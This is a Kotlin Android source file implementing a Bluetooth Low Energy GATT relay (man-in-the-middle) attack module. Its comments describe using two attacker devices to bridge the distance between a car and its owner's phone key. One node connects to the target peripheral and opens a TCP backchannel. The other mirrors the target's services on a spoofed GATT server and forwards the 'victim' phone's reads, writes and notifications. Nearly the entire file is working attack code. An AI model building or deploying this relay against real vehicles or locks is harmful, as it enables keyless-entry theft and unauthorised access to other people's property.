package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothGattCharacteristic
import android.bluetooth.BluetoothGattDescriptor
import android.bluetooth.BluetoothGattServer
import android.bluetooth.BluetoothGattServerCallback
import android.bluetooth.BluetoothGattService
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.content.Context
import android.os.Build
import android.util.Log
import kotlinx.coroutines.CancellableContinuation
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.DataInputStream
import java.io.DataOutputStream
import java.io.IOException
import java.net.ServerSocket
import java.net.Socket
import java.util.UUID
import kotlin.coroutines.resume

/**
 * Defines the role of this device in the GATT Relay attack topology.
 *
 * <p>
 * A Relay Attack typically involves two attacking devices bridging a large physical distance
 * between a legitimate peripheral (e.g., a Car) and a legitimate central (e.g., a Phone/Key).
 * </p>
 */
enum class RelayRole {
    /**
     * The device located near the "Lock" (e.g., the Car).
     * It spoofs the Phone to the Car.
     */
    NODE_A_CAR_SIDE,

    /**
     * The device located near the "Key" (e.g., the Phone/Owner).
     * It spoofs the Car to the Phone.
     */
    NODE_B_PHONE_SIDE
}

/**
 * Implementation of a GATT Relay (Man-in-the-Middle) attack module.
 *
 * <p>
 * This module coordinates the relaying of GATT packets between two attacker nodes.
 * Node A connects as a GATT client to the target peripheral and opens a TCP server
 * as the backchannel. Node B connects to Node A over TCP and mirrors the discovered
 * services on a local GATT server so the victim central connects to it.
 * </p>
 *
 * @param context Application context for Bluetooth system service access.
 * @param backchannelPort TCP port for the relay backchannel between the two nodes.
 */
@SuppressLint("MissingPermission")
class GattRelayModule(
    private val context: Context,
    private val backchannelPort: Int = DEFAULT_BACKCHANNEL_PORT
) {

    companion object {
        private const val TAG = "GattRelayModule"
        private const val DEFAULT_BACKCHANNEL_PORT = 9876

        // Protocol message types sent over the TCP backchannel
        private const val MSG_SERVICE_DISCOVERY: Byte = 0x01
        private const val MSG_CHAR_READ_REQUEST: Byte = 0x02
        private const val MSG_CHAR_READ_RESPONSE: Byte = 0x03
        private const val MSG_CHAR_WRITE_REQUEST: Byte = 0x04
        private const val MSG_CHAR_WRITE_RESPONSE: Byte = 0x05
        private const val MSG_NOTIFICATION: Byte = 0x06
        private const val MSG_DESC_READ_REQUEST: Byte = 0x07
        private const val MSG_DESC_READ_RESPONSE: Byte = 0x08

        /** Client Characteristic Configuration Descriptor UUID. */
        private val CCCD_UUID: UUID = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb")
    }

    /**
     * Queued GATT server requests from the Binder thread, processed on Dispatchers.IO.
     */
    private sealed class GattRequest {
        data class CharReadRequest(
            val device: BluetoothDevice,
            val requestId: Int,
            val offset: Int,
            val serviceUuid: UUID,
            val charUuid: UUID
        ) : GattRequest()

        data class CharWriteRequest(
            val device: BluetoothDevice,
            val requestId: Int,
            val offset: Int,
            val responseNeeded: Boolean,
            val serviceUuid: UUID,
            val charUuid: UUID,
            val data: ByteArray
        ) : GattRequest()
    }

    /**
     * Single shared callback for GATT client operations (connection, discovery, reads).
     * Uses mutable continuation fields so that connectGattClient(), discoverServices(),
     * and readCharacteristicAsync() all share the same callback instance registered
     * with connectGatt().
     */
    private inner class GattRelayCallback : BluetoothGattCallback() {
        @Volatile
        var connectionContinuation: CancellableContinuation<BluetoothGatt?>? = null

        @Volatile
        var discoveryContinuation: CancellableContinuation<Boolean>? = null

        @Volatile
        var readContinuation: CancellableContinuation<ByteArray>? = null

        override fun onConnectionStateChange(gatt: BluetoothGatt?, status: Int, newState: Int) {
            if (newState == BluetoothProfile.STATE_CONNECTED) {
                connectionContinuation?.resume(gatt)
                connectionContinuation = null
            } else if (newState == BluetoothProfile.STATE_DISCONNECTED && status != BluetoothGatt.GATT_SUCCESS) {
                gatt?.close()
                connectionContinuation?.resume(null)
                connectionContinuation = null
            }
        }

        override fun onServicesDiscovered(gatt: BluetoothGatt?, status: Int) {
            discoveryContinuation?.resume(status == BluetoothGatt.GATT_SUCCESS)
            discoveryContinuation = null
        }

        @Suppress("DEPRECATION")
        override fun onCharacteristicRead(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic,
            status: Int
        ) {
            // Called on pre-TIRAMISU; data is in characteristic.value
            val data = if (status == BluetoothGatt.GATT_SUCCESS) {
                characteristic.value ?: ByteArray(0)
            } else {
                ByteArray(0)
            }
            readContinuation?.resume(data)
            readContinuation = null
        }

        override fun onCharacteristicRead(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic,
            value: ByteArray,
            status: Int
        ) {
            // Called on TIRAMISU+; data is in the value parameter
            val data = if (status == BluetoothGatt.GATT_SUCCESS) value else ByteArray(0)
            readContinuation?.resume(data)
            readContinuation = null
        }
    }

    private val bluetoothManager: BluetoothManager? by lazy {
        context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
    }
    private val bluetoothAdapter: BluetoothAdapter? by lazy { bluetoothManager?.adapter }

    private var gattClient: BluetoothGatt? = null
    private var gattServer: BluetoothGattServer? = null
    private var tcpServerSocket: ServerSocket? = null
    private var tcpSocket: Socket? = null
    private var gattRelayCallback: GattRelayCallback? = null

    /**
     * Starts the relay operation based on the selected role.
     *
     * @param role The role this device is playing (Near Car or Near Phone).
     * @param targetAddress The MAC address of the victim device to target.
     * @return A Flow of status logs.
     */
    fun startRelay(role: RelayRole, targetAddress: String): Flow<String> = flow {
        emit("Initializing GATT Relay as $role...")

        if (bluetoothManager == null || bluetoothAdapter == null) {
            emit("ERROR: Bluetooth not available on this device.")
            return@flow
        }

        when (role) {
            RelayRole.NODE_A_CAR_SIDE -> runNodeA(targetAddress).collect { emit(it) }
            RelayRole.NODE_B_PHONE_SIDE -> runNodeB(targetAddress).collect { emit(it) }
        }
    }.flowOn(Dispatchers.IO)

    /**
     * Node A: Near the target peripheral (e.g., car).
     * - Connects as GATT client to the target device
     * - Discovers its services
     * - Opens a TCP server socket for the backchannel
     * - Forwards GATT data between the target peripheral and Node B over TCP
     */
    private fun runNodeA(targetAddress: String): Flow<String> = flow {
        val adapter = bluetoothAdapter ?: run {
            emit("ERROR: BluetoothAdapter not available.")
            return@flow
        }

        val targetDevice: BluetoothDevice = adapter.getRemoteDevice(targetAddress)
        emit("Connecting as GATT client to target peripheral $targetAddress...")

        // Connect GATT client to the target peripheral
        val gattResult = connectGattClient(targetDevice)
        if (gattResult == null) {
            emit("ERROR: Failed to connect GATT client to $targetAddress.")
            return@flow
        }
        gattClient = gattResult
        emit("GATT client connected to $targetAddress.")

        // Discover services on the target
        emit("Discovering services on target peripheral...")
        val discoverySuccess = discoverServices(gattResult)
        if (!discoverySuccess) {
            emit("ERROR: Service discovery failed.")
            gattResult.close()
            return@flow
        }

        val services = gattResult.services
        emit("Discovered ${services.size} services on target peripheral.")
        for (service in services) {
            emit("  Service: ${service.uuid} (${service.characteristics.size} characteristics)")
        }

        // Open TCP server socket for the backchannel
        emit("Opening TCP backchannel server on port $backchannelPort...")
        try {
            tcpServerSocket = ServerSocket(backchannelPort)
        } catch (e: IOException) {
            emit("ERROR: Failed to open TCP server on port $backchannelPort: ${e.message}")
            gattResult.close()
            return@flow
        }
        emit("TCP server listening. Waiting for Node B to connect...")

        // Wait for Node B to connect
        val clientSocket = try {
            tcpServerSocket!!.accept()
        } catch (e: IOException) {
            emit("ERROR: TCP accept failed: ${e.message}")
            gattResult.close()
            return@flow
        }
        tcpSocket = clientSocket
        emit("Node B connected from ${clientSocket.inetAddress.hostAddress}.")

        val dataOut = DataOutputStream(clientSocket.getOutputStream())
        val dataIn = DataInputStream(clientSocket.getInputStream())

        // Send service discovery info to Node B
        emit("Sending service discovery data to Node B...")
        sendServiceDiscoveryToNodeB(dataOut, services)
        emit("Service discovery data sent.")

        // Enable notifications on all notifiable characteristics
        for (service in services) {
            for (characteristic in service.characteristics) {
                if (characteristic.properties and BluetoothGattCharacteristic.PROPERTY_NOTIFY != 0) {
                    gattResult.setCharacteristicNotification(characteristic, true)
                    val cccd = characteristic.getDescriptor(CCCD_UUID)
                    if (cccd != null) {
                        cccd.value = BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE
                        gattResult.writeDescriptor(cccd)
                    }
                }
            }
        }

        // Main relay loop: read requests from Node B, forward to target, send responses back
        emit("Relay active. Forwarding GATT operations...")
        try {
            while (!clientSocket.isClosed) {
                val msgType = try {
                    dataIn.readByte()
                } catch (e: IOException) {
                    emit("Node B disconnected.")
                    break
                }

                when (msgType) {
                    MSG_CHAR_READ_REQUEST -> {
                        val serviceUuid = UUID.fromString(dataIn.readUTF())
                        val charUuid = UUID.fromString(dataIn.readUTF())
                        emit("Relay: Read request for $charUuid on service $serviceUuid")

                        val service = gattResult.getService(serviceUuid)
                        val characteristic = service?.getCharacteristic(charUuid)
                        if (characteristic != null) {
                            // Read actual data from the target via the shared callback
                            val value = readCharacteristicAsync(gattResult, characteristic)
                            dataOut.writeByte(MSG_CHAR_READ_RESPONSE.toInt())
                            dataOut.writeUTF(serviceUuid.toString())
                            dataOut.writeUTF(charUuid.toString())
                            dataOut.writeInt(value.size)
                            dataOut.write(value)
                            dataOut.flush()
                        }
                    }
                    MSG_CHAR_WRITE_REQUEST -> {
                        val serviceUuid = UUID.fromString(dataIn.readUTF())
                        val charUuid = UUID.fromString(dataIn.readUTF())
                        val dataLen = dataIn.readInt()
                        val data = ByteArray(dataLen)
                        dataIn.readFully(data)
                        emit("Relay: Write request for $charUuid ($dataLen bytes)")

                        val service = gattResult.getService(serviceUuid)
                        val characteristic = service?.getCharacteristic(charUuid)
                        if (characteristic != null) {
                            // Use version-appropriate write API (1E fix)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                gattResult.writeCharacteristic(
                                    characteristic,
                                    data,
                                    BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
                                )
                            } else {
                                @Suppress("DEPRECATION")
                                characteristic.value = data
                                @Suppress("DEPRECATION")
                                gattResult.writeCharacteristic(characteristic)
                            }
                            dataOut.writeByte(MSG_CHAR_WRITE_RESPONSE.toInt())
                            dataOut.writeUTF(serviceUuid.toString())
                            dataOut.writeUTF(charUuid.toString())
                            dataOut.writeByte(BluetoothGatt.GATT_SUCCESS)
                            dataOut.flush()
                        }
                    }
                }
            }
        } catch (e: IOException) {
            emit("Relay loop ended: ${e.message}")
        } finally {
            emit("Cleaning up Node A resources...")
            cleanup()
        }
    }.flowOn(Dispatchers.IO)

    /**
     * Node B: Near the victim central (e.g., the phone/owner).
     * - Connects to Node A over TCP
     * - Receives service discovery data
     * - Sets up a local GATT server mirroring the target's services
     * - Proxies GATT operations from the victim central through TCP to Node A
     *
     * GATT server callbacks queue requests into a Channel so that TCP I/O runs on
     * Dispatchers.IO instead of the Binder thread.
     */
    private fun runNodeB(targetAddress: String): Flow<String> = flow {
        val manager = bluetoothManager ?: run {
            emit("ERROR: BluetoothManager not available.")
            return@flow
        }

        // Connect to Node A over TCP
        emit("Connecting to Node A TCP backchannel at $targetAddress:$backchannelPort...")
        val socket: Socket
        try {
            socket = Socket(targetAddress, backchannelPort)
        } catch (e: IOException) {
            emit("ERROR: Failed to connect to Node A: ${e.message}")
            return@flow
        }
        tcpSocket = socket
        emit("Connected to Node A.")

        val dataIn = DataInputStream(socket.getInputStream())
        val dataOut = DataOutputStream(socket.getOutputStream())

        // Receive service discovery data from Node A
        emit("Receiving service discovery data from Node A...")
        val mirroredServices = receiveServiceDiscoveryFromNodeA(dataIn)
        emit("Received ${mirroredServices.size} services to mirror.")

        // Channel for queuing GATT requests off the Binder thread
        val gattRequestChannel = Channel<GattRequest>(Channel.UNLIMITED)

        // Set up a local GATT server mirroring the target's services.
        // Callbacks enqueue requests into the channel and return immediately,
        // avoiding blocking TCP I/O on the Binder thread.
        emit("Setting up mirrored GATT server...")
        val serverCallback = object : BluetoothGattServerCallback() {
            override fun onConnectionStateChange(device: BluetoothDevice?, status: Int, newState: Int) {
                when (newState) {
                    BluetoothProfile.STATE_CONNECTED -> {
                        Log.i(TAG, "Victim central connected: ${device?.address}")
                    }
                    BluetoothProfile.STATE_DISCONNECTED -> {
                        Log.i(TAG, "Victim central disconnected: ${device?.address}")
                    }
                }
            }

            override fun onCharacteristicReadRequest(
                device: BluetoothDevice?, requestId: Int, offset: Int,
                characteristic: BluetoothGattCharacteristic?
            ) {
                if (device == null || characteristic == null) return
                val service = characteristic.service ?: return
                gattRequestChannel.trySend(
                    GattRequest.CharReadRequest(
                        device = device,
                        requestId = requestId,
                        offset = offset,
                        serviceUuid = service.uuid,
                        charUuid = characteristic.uuid
                    )
                )
            }

            override fun onCharacteristicWriteRequest(
                device: BluetoothDevice?, requestId: Int,
                characteristic: BluetoothGattCharacteristic?,
                preparedWrite: Boolean, responseNeeded: Boolean,
                offset: Int, value: ByteArray?
            ) {
                if (device == null || characteristic == null) return
                val service = characteristic.service ?: return
                gattRequestChannel.trySend(
                    GattRequest.CharWriteRequest(
                        device = device,
                        requestId = requestId,
                        offset = offset,
                        responseNeeded = responseNeeded,
                        serviceUuid = service.uuid,
                        charUuid = characteristic.uuid,
                        data = value ?: ByteArray(0)
                    )
                )
            }

            override fun onDescriptorReadRequest(
                device: BluetoothDevice?, requestId: Int, offset: Int,
                descriptor: BluetoothGattDescriptor?
            ) {
                device ?: return
                val value = descriptor?.value ?: BluetoothGattDescriptor.DISABLE_NOTIFICATION_VALUE
                gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_SUCCESS, offset, value)
            }

            override fun onDescriptorWriteRequest(
                device: BluetoothDevice?, requestId: Int,
                descriptor: BluetoothGattDescriptor?,
                preparedWrite: Boolean, responseNeeded: Boolean,
                offset: Int, value: ByteArray?
            ) {
                device ?: return
                if (descriptor != null) {
                    descriptor.value = value
                }
                if (responseNeeded) {
                    gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_SUCCESS, 0, null)
                }
            }
        }

        gattServer = manager.openGattServer(context, serverCallback)
        if (gattServer == null) {
            emit("ERROR: Failed to open GATT server.")
            socket.close()
            return@flow
        }

        // Add mirrored services
        for (service in mirroredServices) {
            gattServer!!.addService(service)
        }
        emit("GATT server ready with ${mirroredServices.size} mirrored services. Waiting for victim central...")

        // Launch a dedicated coroutine to process queued GATT requests on Dispatchers.IO.
        // This keeps TCP I/O off the Binder thread.
        val processingScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        processingScope.launch {
            for (request in gattRequestChannel) {
                try {
                    when (request) {
                        is GattRequest.CharReadRequest -> {
                            // Forward read request to Node A over TCP
                            dataOut.writeByte(MSG_CHAR_READ_REQUEST.toInt())
                            dataOut.writeUTF(request.serviceUuid.toString())
                            dataOut.writeUTF(request.charUuid.toString())
                            dataOut.flush()

                            // Read response from Node A
                            val responseType = dataIn.readByte()
                            if (responseType == MSG_CHAR_READ_RESPONSE) {
                                dataIn.readUTF() // service UUID (discard)
                                dataIn.readUTF() // char UUID (discard)
                                val dataLen = dataIn.readInt()
                                val data = ByteArray(dataLen)
                                dataIn.readFully(data)
                                gattServer?.sendResponse(
                                    request.device, request.requestId,
                                    BluetoothGatt.GATT_SUCCESS, request.offset, data
                                )
                            } else {
                                gattServer?.sendResponse(
                                    request.device, request.requestId,
                                    BluetoothGatt.GATT_FAILURE, request.offset, null
                                )
                            }
                        }
                        is GattRequest.CharWriteRequest -> {
                            // Forward write request to Node A over TCP
                            dataOut.writeByte(MSG_CHAR_WRITE_REQUEST.toInt())
                            dataOut.writeUTF(request.serviceUuid.toString())
                            dataOut.writeUTF(request.charUuid.toString())
                            dataOut.writeInt(request.data.size)
                            dataOut.write(request.data)
                            dataOut.flush()

                            if (request.responseNeeded) {
                                val responseType = dataIn.readByte()
                                if (responseType == MSG_CHAR_WRITE_RESPONSE) {
                                    dataIn.readUTF() // service UUID
                                    dataIn.readUTF() // char UUID
                                    val status = dataIn.readByte().toInt()
                                    gattServer?.sendResponse(
                                        request.device, request.requestId,
                                        status, request.offset, null
                                    )
                                } else {
                                    gattServer?.sendResponse(
                                        request.device, request.requestId,
                                        BluetoothGatt.GATT_FAILURE, request.offset, null
                                    )
                                }
                            }
                        }
                    }
                } catch (e: IOException) {
                    Log.e(TAG, "Error processing GATT request", e)
                    when (request) {
                        is GattRequest.CharReadRequest -> {
                            gattServer?.sendResponse(
                                request.device, request.requestId,
                                BluetoothGatt.GATT_FAILURE, request.offset, null
                            )
                        }
                        is GattRequest.CharWriteRequest -> {
                            if (request.responseNeeded) {
                                gattServer?.sendResponse(
                                    request.device, request.requestId,
                                    BluetoothGatt.GATT_FAILURE, request.offset, null
                                )
                            }
                        }
                    }
                }
            }
        }

        // Keep alive until the TCP connection drops
        try {
            while (!socket.isClosed) {
                // Check if the connection is still alive by reading with timeout
                val msgType = try {
                    dataIn.readByte()
                } catch (e: IOException) {
                    emit("Node A disconnected.")
                    break
                }

                // Handle notifications forwarded from Node A
                if (msgType == MSG_NOTIFICATION) {
                    val serviceUuid = UUID.fromString(dataIn.readUTF())
                    val charUuid = UUID.fromString(dataIn.readUTF())
                    val dataLen = dataIn.readInt()
                    val notifyData = ByteArray(dataLen)
                    dataIn.readFully(notifyData)

                    // Forward notification to connected victim central
                    val mirroredService = gattServer?.getService(serviceUuid)
                    val mirroredChar = mirroredService?.getCharacteristic(charUuid)
                    if (mirroredChar != null) {
                        mirroredChar.value = notifyData
                        val connectedDevices = manager.getConnectedDevices(BluetoothProfile.GATT)
                        for (connectedDevice in connectedDevices) {
                            gattServer?.notifyCharacteristicChanged(connectedDevice, mirroredChar, false)
                        }
                    }
                }
            }
        } catch (e: IOException) {
            emit("Node B relay loop ended: ${e.message}")
        } finally {
            emit("Cleaning up Node B resources...")
            processingScope.cancel()
            gattRequestChannel.close()
            cleanup()
        }
    }.flowOn(Dispatchers.IO)

    /**
     * Reads a characteristic from the target peripheral asynchronously,
     * suspending until the onCharacteristicRead callback fires with actual data.
     */
    private suspend fun readCharacteristicAsync(
        gatt: BluetoothGatt,
        characteristic: BluetoothGattCharacteristic
    ): ByteArray {
        val callback = gattRelayCallback ?: return ByteArray(0)
        return suspendCancellableCoroutine { cont ->
            callback.readContinuation = cont
            gatt.readCharacteristic(characteristic)
        }
    }

    /**
     * Serializes discovered GATT services over the TCP backchannel to Node B.
     */
    private fun sendServiceDiscoveryToNodeB(
        dataOut: DataOutputStream,
        services: List<BluetoothGattService>
    ) {
        dataOut.writeByte(MSG_SERVICE_DISCOVERY.toInt())
        dataOut.writeInt(services.size)
        for (service in services) {
            dataOut.writeUTF(service.uuid.toString())
            dataOut.writeInt(service.type)
            dataOut.writeInt(service.characteristics.size)
            for (characteristic in service.characteristics) {
                dataOut.writeUTF(characteristic.uuid.toString())
                dataOut.writeInt(characteristic.properties)
                dataOut.writeInt(characteristic.permissions)
                val value = characteristic.value
                if (value != null) {
                    dataOut.writeInt(value.size)
                    dataOut.write(value)
                } else {
                    dataOut.writeInt(0)
                }
                // Write descriptors
                dataOut.writeInt(characteristic.descriptors.size)
                for (descriptor in characteristic.descriptors) {
                    dataOut.writeUTF(descriptor.uuid.toString())
                    dataOut.writeInt(descriptor.permissions)
                }
            }
        }
        dataOut.flush()
    }

    /**
     * Deserializes GATT service definitions received from Node A and creates
     * local [BluetoothGattService] objects to mirror on this device's GATT server.
     */
    private fun receiveServiceDiscoveryFromNodeA(
        dataIn: DataInputStream
    ): List<BluetoothGattService> {
        val msgType = dataIn.readByte()
        if (msgType != MSG_SERVICE_DISCOVERY) {
            Log.e(TAG, "Expected SERVICE_DISCOVERY message, got $msgType")
            return emptyList()
        }

        val serviceCount = dataIn.readInt()
        val services = mutableListOf<BluetoothGattService>()

        for (i in 0 until serviceCount) {
            val serviceUuid = UUID.fromString(dataIn.readUTF())
            val serviceType = dataIn.readInt()
            val charCount = dataIn.readInt()

            val service = BluetoothGattService(serviceUuid, serviceType)

            for (j in 0 until charCount) {
                val charUuid = UUID.fromString(dataIn.readUTF())
                val properties = dataIn.readInt()
                val permissions = dataIn.readInt()
                val valueLen = dataIn.readInt()
                val value = if (valueLen > 0) {
                    val buf = ByteArray(valueLen)
                    dataIn.readFully(buf)
                    buf
                } else {
                    null
                }

                val characteristic = BluetoothGattCharacteristic(charUuid, properties, permissions)
                if (value != null) {
                    characteristic.value = value
                }

                // Read descriptors
                val descCount = dataIn.readInt()
                for (k in 0 until descCount) {
                    val descUuid = UUID.fromString(dataIn.readUTF())
                    val descPermissions = dataIn.readInt()
                    val descriptor = BluetoothGattDescriptor(descUuid, descPermissions)
                    characteristic.addDescriptor(descriptor)
                }

                service.addCharacteristic(characteristic)
            }

            services.add(service)
        }

        return services
    }

    /**
     * Connects to a remote BLE device as a GATT client and suspends until the
     * connection callback fires. Uses the shared [GattRelayCallback] so that
     * subsequent service discovery and characteristic reads use the same callback
     * registered with connectGatt().
     */
    private suspend fun connectGattClient(device: BluetoothDevice): BluetoothGatt? {
        val callback = GattRelayCallback()
        gattRelayCallback = callback
        return suspendCancellableCoroutine { cont ->
            callback.connectionContinuation = cont
            val gattInstance = device.connectGatt(context, false, callback)
            cont.invokeOnCancellation { gattInstance?.close() }
        }
    }

    /**
     * Initiates GATT service discovery and suspends until the shared callback's
     * onServicesDiscovered fires.
     */
    private suspend fun discoverServices(gatt: BluetoothGatt): Boolean {
        val callback = gattRelayCallback ?: return false
        return suspendCancellableCoroutine { cont ->
            callback.discoveryContinuation = cont
            gatt.discoverServices()
        }
    }

    /**
     * Stops the relay and releases all resources. Alias for [cleanup].
     */
    fun stop() {
        cleanup()
    }

    /**
     * Releases all resources held by this module.
     */
    fun cleanup() {
        try {
            gattClient?.close()
            gattClient = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing GATT client", e)
        }
        try {
            gattServer?.close()
            gattServer = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing GATT server", e)
        }
        try {
            tcpSocket?.close()
            tcpSocket = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing TCP socket", e)
        }
        try {
            tcpServerSocket?.close()
            tcpServerSocket = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing TCP server socket", e)
        }
        gattRelayCallback = null
    }
}
